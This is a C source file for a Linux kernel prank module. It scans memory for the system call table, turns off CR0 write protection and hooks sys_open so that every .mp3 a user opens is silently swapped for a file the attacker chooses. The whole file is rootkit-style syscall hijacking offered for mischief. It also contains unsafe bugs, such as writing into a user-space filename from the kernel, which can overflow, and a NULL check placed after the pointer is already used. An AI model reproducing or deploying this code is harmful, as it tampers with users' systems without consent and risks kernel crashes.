#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/module.h> 
#include <linux/init.h> 
#include <asm/unistd.h> 
#include <asm/amd_nb.h>
#include <linux/highuid.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Francisco Sanz");
MODULE_DESCRIPTION("for teh lulz!");


unsigned long **sys_call_table;
char *rollfile;
module_param(rollfile, charp, 0000);
MODULE_PARM_DESC(rollfile, "music trolling file");

asmlinkage long (*ref_sys_open) (const char __user *filename, int flags,
                                 umode_t umode);

asmlinkage long new_sys_open(const char __user *filename, int flags, umode_t mode){
  int len = strlen(rollfile) + 1;
  char *p;
  int r;
  p = (char *)(filename + strlen(filename) - 4);

  if( rollfile !=NULL && !strcmp(p, ".mp3")){
    void *buf = kmalloc(len, GFP_KERNEL);
    memcpy(buf, filename, len);
    printk(KERN_INFO "patching %s with %s\n", filename, rollfile);
    memcpy((void*)filename, rollfile, len);
    r = ref_sys_open((void*)filename, flags, mode);
    kfree(buf);
  }
  else{
    r = ref_sys_open(filename, flags, mode);
  }
  return r;
}

static unsigned long **aquire_sys_call_table(void){
  unsigned long int offset = PAGE_OFFSET;
  unsigned long **sct;

  while(offset < ULLONG_MAX){
    sct = (unsigned long **)offset;
    if(sct[__NR_close] == (unsigned long *) sys_close)
      return sct;

    offset += sizeof(void *);
  }

  return NULL;
 
}

static void disable_page_protection(void){
  unsigned long value;
  asm volatile("mov %%cr0, %0" : "=r" (value));

  if(!(value & 0x00010000))
    return;
  asm volatile("mov %0, %%cr0" : : "r" (value & ~0x00010000));
}

static void enable_page_protection(void){
  unsigned long value;
  asm volatile("mov %%cr0, %0" : "=r" (value));

  if((value & 0x00010000))
    return;

  asm volatile("mov %0, %%cr0" : : "r" (value | 0x00010000));
}

static int __init kernelroll_start(void){
  if(!(sys_call_table = aquire_sys_call_table()))
    return -1;

  disable_page_protection();
  ref_sys_open = (void*)sys_call_table[__NR_open];

  sys_call_table[__NR_open] = (unsigned long *)new_sys_open;
  enable_page_protection();

  return 0;
}

static void __exit kernelroll_end(void)
{
  if(!sys_call_table)
    return;

  disable_page_protection();
  sys_call_table[__NR_open] = (unsigned long *) ref_sys_open;
  enable_page_protection();

}

module_init(kernelroll_start);
module_exit(kernelroll_end);


